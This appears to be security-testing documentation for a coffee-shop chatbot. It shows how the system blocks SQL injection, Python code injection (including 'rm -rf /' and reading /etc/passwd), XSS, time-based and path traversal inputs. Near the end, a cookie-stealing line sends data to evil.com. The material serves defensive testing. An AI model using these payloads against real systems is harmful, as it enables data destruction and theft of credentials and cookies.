```

### 3. Malicious Payload Scenarios

#### 3.1 SQL Injection Attack
```
Malicious Input: "outlets in '; DROP TABLE outlets; --"

System Processing:
├─ Text2SQL Processing: Natural language analysis
├─ SQL Generation: "SELECT * FROM outlets WHERE city LIKE ?"
├─ Parameter Binding: ["%'; DROP TABLE outlets; --%"]
├─ Security Validation: Query safety check
├─ Safe Execution: Parameterized query only
└─ Result: No SQL injection executed

Database State: ✅ Table intact, no data lost
Security Measures: ✅ Parameterized queries prevent injection
Query Safety: ✅ Dangerous keywords filtered
Result: Safe search with no malicious execution

Additional Security Tests:
- "' OR '1'='1" → Safe parameter binding
- "'; SELECT * FROM sqlite_master; --" → Blocked by query validation
- "' UNION SELECT password FROM users --" → No unauthorized data access
```

#### 3.2 Code Injection Attack
```
Malicious Input: "Calculate __import__('os').system('rm -rf /')"

System Processing:
├─ Calculator Intent Detection: ARITHMETIC intent analysis
├─ Expression Parsing: "__import__('os').system('rm -rf /')"
├─ Security Validation: No numeric expressions found
├─ Code Execution Prevention: AST-only evaluation
├─ Dangerous Pattern Detection: Import statements blocked
└─ Safe Response: Mathematical expression required

Security Result: ✅ No code execution
System Safety: ✅ No file system access
Error Handling: ✅ Educational error message
Input Validation: ✅ Code patterns rejected

Alternative Injection Attempts:
- "exec('print(\"hacked\")')" → Blocked by expression validator
- "eval('__import__(\"subprocess\").call([\"ls\"])')" → AST parser rejection
- "open('/etc/passwd', 'r').read()" → No file system access
```

#### 3.3 XSS (Cross-Site Scripting) Attack
```
Malicious Input: "<script>alert('xss')</script>"

System Processing:
├─ Product Search: Query with script tags
├─ Input Sanitization: HTML tag detection
├─ Response Generation: Clean response creation
├─ Output Filtering: Script tag removal
├─ Security Headers: Proper content type
└─ Safe Response: No executable content

Security Result: ✅ Script tags removed from response
Output Safety: ✅ No JavaScript execution possible
Response Security: ✅ Proper content-type headers
User Protection: ✅ Browser cannot execute injected code

Additional XSS Tests:
- "<img src=x onerror=alert('xss')>" → Event handlers stripped
- "javascript:alert('xss')" → JavaScript URLs blocked
- "<iframe src='javascript:alert(\"xss\")'>" → Dangerous iframes removed
```

## Advanced Security Demonstrations

### 4. Stacked Query Prevention
```
Malicious Input: "test'; CREATE TABLE hacked (id INTEGER); SELECT * FROM outlets; --"

SQL Security Analysis:
├─ Query Pattern Detection: Multiple statements identified
├─ Statement Separation: Semicolon-based attacks blocked
├─ Database Isolation: Only SELECT statements allowed
├─ Command Validation: CREATE, INSERT, UPDATE blocked
└─ Safe Execution: Single parameterized SELECT only

Result: ✅ No additional tables created
Database Integrity: ✅ Schema unchanged
Security Logging: ✅ Attack attempt recorded
```

### 5. Time-Based Attack Prevention
```
Malicious Input: "test' AND (SELECT COUNT(*) FROM outlets) > 0 AND SLEEP(5) --"

Timing Attack Analysis:
├─ Execution Time Monitoring: Response time < 100ms
├─ Database Function Blocking: SLEEP function unavailable
├─ Information Leak Prevention: No timing-based data disclosure
├─ Query Optimization: Fast parameterized execution
└─ Performance Consistency: No execution delays

Result: ✅ No timing delays observed
Information Security: ✅ No data leakage through timing
Performance: ✅ Consistent response times
```

### 6. Path Traversal Prevention
```
Malicious Input: "../../../etc/passwd"

File System Security:
├─ Input Processing: Query treated as search term only
├─ File System Isolation: No file system access from queries
├─ Path Validation: Directory traversal patterns ignored
├─ Response Safety: No file content in responses
└─ Security Boundary: Application-level file access only

Result: ✅ No file system access
Content Security: ✅ No sensitive file content disclosed
System Isolation: ✅ Application boundaries maintained
```

## Error Recovery and User Experience

### 7. Graceful Degradation Example
```
Scenario: Multiple System Failures

User: "Find me insulated coffee cups under RM 50"

System Status:
├─ Product Vector Store: ❌ Service Unavailable
├─ Text2SQL System: ✅ Operational
├─ Basic Product API: ❌ Database Connection Lost
├─ Calculator: ✅ Operational
└─ Core Chatbot: ✅ Operational

Response Strategy:
├─ Primary Service: Failed gracefully
├─ Fallback Services: Not applicable for this query
├─ Alternative Help: Offer other available services
└─ Recovery Guidance: Suggest retry and alternative actions

Bot Response:
"I'm sorry, I'm having trouble accessing the product search system right now. Please try again later.

In the meantime, I can help you with:
• ZUS Coffee outlet locations and information
• Mathematical calculations
• General questions about our services

Would you like me to help you find a nearby outlet where you can see our products in person?"

User Experience Benefits:
✅ Transparent communication about issues
✅ Alternative assistance offered
✅ Positive, helpful tone maintained
✅ Clear guidance for next steps
```

### 8. Educational Error Messages
```
User Input: "SELECT * FROM products WHERE price < 50"

System Processing:
├─ Intent Analysis: SQL command detected (not natural language)
├─ Context Understanding: User attempting direct database query
├─ Educational Response: Explain proper interaction method
└─ Helpful Guidance: Show correct way to search

Bot Response:
"I understand you're looking for products under RM 50, but I can't process SQL commands directly. Instead, you can ask me in natural language like:

'Show me products under RM 50'
'Find coffee cups under RM 50'
'What drinkware do you have for less than RM 50?'

Would you like me to search for affordable products for you?"

Educational Value:
✅ Recognizes user intent despite wrong format
✅ Explains why request can't be processed
✅ Provides correct alternatives
✅ Offers to help with proper format
```

- System: Blocks code execution, treats as invalid mathematical expression
- Result: No code execution, no external connections

Phase 3: Data Exfiltration Attempt
- Attacker: "<img src='http://evil.com/steal?data=' + document.cookie>"
- System: Removes script elements, sanitizes output
- Result: No XSS execution, no data theft

Phase 4: Service Disruption Attempt
- Attacker: Sends 10000-character query string
- System: Handles large input gracefully, processes safely
- Result: Service remains available, no DoS achieved
